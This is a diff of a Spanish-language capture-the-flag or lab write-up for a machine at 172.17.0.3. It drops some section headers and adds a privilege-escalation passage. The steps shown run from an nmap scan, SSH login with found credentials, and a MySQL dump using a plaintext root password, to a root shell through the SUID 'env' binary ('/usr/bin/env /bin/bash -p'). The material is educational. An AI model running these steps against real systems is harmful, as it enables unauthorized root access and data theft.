@@ -5,8 +5,6 @@
 
 ---
 
-## 🔍 Escaneo inicial
-
 Ejecutamos un escaneo básico con `nmap`:
 
 ```bash
@@ -34,7 +32,6 @@ PORT   STATE SERVICE VERSION
 
 ---
 
-## 🌐 Análisis Web
 
 Visitamos la dirección `http://172.17.0.3` en el navegador y encontramos una **página de login**.
 
@@ -55,8 +52,6 @@ Tenemos:
 
 ---
 
-## 🔐 Acceso por SSH
-
 Probamos a conectarnos con esas credenciales:
 
 ```bash
@@ -67,7 +62,6 @@ ssh dylan@172.17.0.3
 
 ---
 
-## 🛠️ Enumeración interna
 
 Intentamos enumerar con `sudo -l`, pero no está disponible.
 
@@ -94,8 +88,6 @@ return [
 ```
 
 ---
-
-## 🧬 Acceso a MySQL
 
 Usamos las credenciales para acceder a la base de datos:
 
@@ -138,27 +130,47 @@ mysqldump --databases register -u root -ppaso > datos.sql
 
 ---
 
-## 🧨 Escalada de privilegios
-
 Buscamos archivos con el bit SUID activado:
 
 ```bash
 find / -perm -4000 -user root 2>/dev/null
 ```
 
-Una opción útil es:
+Obtenemos:
+
+```
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/passwd
+/usr/bin/env
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/umount
+/usr/bin/su
+/usr/bin/gpasswd
+```
+
+Estos binarios tienen el **bit SUID de root** activado. Esto significa que, si logramos ejecutar alguno de ellos de forma controlada, **podríamos obtener permisos de root**.
+
+Uno de los más interesantes es `env`. Podemos usarlo para ejecutar `bash` manteniendo los privilegios del propietario (root), gracias al parámetro `-p` que conserva los permisos efectivos:
 
 ```bash
 /usr/bin/env /bin/bash -p
 ```
 
+Si funciona correctamente, obtendremos una **shell como root**, y lo podremos comprobar con:
+
+```bash
+whoami
+```
+
 ---
 
-## ✅ Estado actual
+**Si devuelve `root`, la escalada fue exitosa.**
 
-- ✅ Acceso SSH como **dylan**
-- ✅ Acceso completo a la base de datos MySQL
-- ⛔ No se ha logrado escalar privilegios a root (por ahora)
+
 
 
 
